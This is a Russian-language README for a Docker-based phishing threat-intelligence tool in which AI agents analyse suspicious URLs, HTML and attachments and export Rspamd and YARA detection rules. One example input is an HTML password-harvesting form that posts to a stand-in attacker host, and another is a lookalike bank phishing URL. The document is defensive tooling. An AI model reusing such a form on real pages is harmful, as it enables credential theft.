# Phishing Threat Intelligence (DW-2)


## Быстрый запуск (Docker)

### Клонирование / распаковка репозитория
Перейдите в корневую директорию проекта:
```bash
cd dw-2
```

### Настройка файла переменных окружения (`.env`)
В корневой папке находится файл `.env.example`. Скопируйте его в `.env`:

*Linux / macOS:*
```bash
cp .env.example .env
```

*Windows (PowerShell):*
```powershell
Copy-Item .env.example .env
```

В файле `.env` задаются параметры подключения к серверу искусственного интеллекта (по умолчанию преднастроен сервер НГУ DeepCode):
```env
# Подключение к LLM/VLM серверу (OpenAI-совместимый API)
AI_BASE_URL=http://deepcode.ci.nsu.ru/api/chat/completions
AI_API_KEY=ваш_ключ_api

# Модели
DEFAULT_LLM_MODEL=Qwen3.8-27B
DEFAULT_VLM_MODEL=Qwen3.8-27B

# Системные параметры
ENVIRONMENT=development
LOG_LEVEL=INFO

Запустите оба сервиса в фоновом режиме:
```bash
docker compose up -d --build
```
Убедитесь, что оба контейнера находятся в состоянии `Up`:
```bash
docker compose ps
```

Проверьте доступность базы данных и начальную статистику:
```bash
docker exec threat_agents python main.py stats
```

#### Анализ URL-ссылки:
Сборщик раскроет редирект-цепочку, песочница сделает рендер и скриншот, извлечет DOM-структуру, фавикон и внешние ресурсы. Аналитик определит бренд и сформирует сигнатуры:
```bash
docker exec threat_agents python main.py analyze "https://sber-online-secure-auth.xyz/login" --type url
```

#### Анализ чистого HTML-кода:
```bash
docker exec threat_agents python main.py analyze "<html><body><form action='http://c2-evil.xyz/post' method='POST'><input type='password' name='pass'></form></body></html>" --type html
```

#### Анализ файла / вложения (PDF, HTML, EML, Картинка с QR, Архив):
1. Скопируйте файл с хост-системы в том песочницы:
   ```bash
   docker cp "tests/test_html/sample_phish.html" threat_agents:/app/data/artifacts/sample.html
   ```
2. Запустите анализ:
   ```bash
   docker exec threat_agents python main.py analyze /app/data/artifacts/sample.html --type file
   ```

*(Опционально: добавьте флаг `--json` для получения чистого JSON-вывода).*

---

### Просмотр отчетов по образцу (`report`)

Вывод сводного структурированного отчета по ID образца в базе данных:
```bash
# Текстовый человекочитаемый отчет:
docker exec threat_agents python main.py report 1

# Полный JSON со всеми артефактами, findings и сигнатурами:
docker exec threat_agents python main.py report 1 --json
```

---

### Просмотр цепочки рассуждений агентов (`trace`)

Показывает протокол работы ReAct-агентов (какие шаги предпринимались, какие инструменты вызывались и какие наблюдения были получены):
```bash
docker exec threat_agents python main.py trace 1
```
Флаги:
- `--full` — не обрезать длинные фрагменты выводов инструментов.
- `--agent collector_agent` или `--agent analyst_agent` — показать шаги только одного агента.

---

### Отслеживание фишинговых кампаний (`campaigns`)

Кластеризация фишинговых атак по совокупности признаков (целевой бренд + структурный хэш DOM `dom_hash`):
```bash
docker exec threat_agents python main.py campaigns
```

---

### Генерация и экспорт компактных правил (`export-rules`)

Экспорт накопленной базы признаков в форматы для легких локальных антиспам-фильтров:

#### Универсальный JSON Rulepack
Содержит brand definitions, легитимные домены, регулярные выражения путей, DOM-хэши, Favicon-хэши и весовые коэффициенты (score):
```bash
docker exec threat_agents python main.py export-rules --format json
```
Сохранение в файл:
```bash
docker exec threat_agents python main.py export-rules --format json --out /app/data/rules.json
```

#### Правила Rspamd (Lua + Символы)
Готовые символы со скорингом для почтового фильтра Rspamd:
```bash
docker exec threat_agents python main.py export-rules --format rspamd
```

#### YARA-сигнатуры
Набор правил YARA для проверки почтовых вложений и файлов:
```bash
docker exec threat_agents python main.py export-rules --format yara
```


### Запуск тестов на хосте (при установленном Python):
```bash
pip install -r requirements.txt
pytest -v
```

### Запуск тестов внутри контейнера:
```bash
docker exec threat_agents pytest -v
```